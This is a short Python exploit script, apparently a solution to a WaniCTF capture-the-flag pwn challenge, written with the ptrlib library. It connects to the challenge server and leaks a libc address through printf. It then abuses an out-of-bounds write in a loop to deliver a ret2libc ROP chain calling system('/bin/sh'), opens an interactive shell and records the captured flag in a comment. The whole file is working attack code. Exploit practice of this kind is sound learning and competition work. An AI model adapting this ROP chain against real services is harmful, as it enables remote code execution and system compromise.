"""
ret2libc due to for loop OOB
"""

from ptrlib import *

file = "./chall"
e = ELF(file)
libc = ELF("./libc.so.6")
sock = Socket("nc chal-ywu5dn.wanictf.org 9005")
#sock = Process(file)
sock.debug = True

sock.recvuntil("printf = ")
addr_printf = int(sock.recvline(), 16)
libc.base = addr_printf - libc.symbol("printf")


calory = "1"
amount = "0"
for i in range(3):
    sock.sendlineafter(":", b"yu1hpa")
    sock.sendlineafter(":", calory)
    sock.sendlineafter(":", amount)

payload = p64(next(libc.gadget("ret;")))
payload += p64(next(libc.gadget("pop rdi; ret;")))
payload += p64(next(libc.search("/bin/sh\x00")))
payload += p64(libc.symbol("system"))

sock.sendlineafter(":", payload)
sock.sendlineafter(":", b"A")
sock.sendlineafter(":", b"A")

sock.sh()
# FLAG{B3_c4r3fu1_wh3n_using_th3_f0rm4t_sp3cifi3r_1f_in_sc4nf}
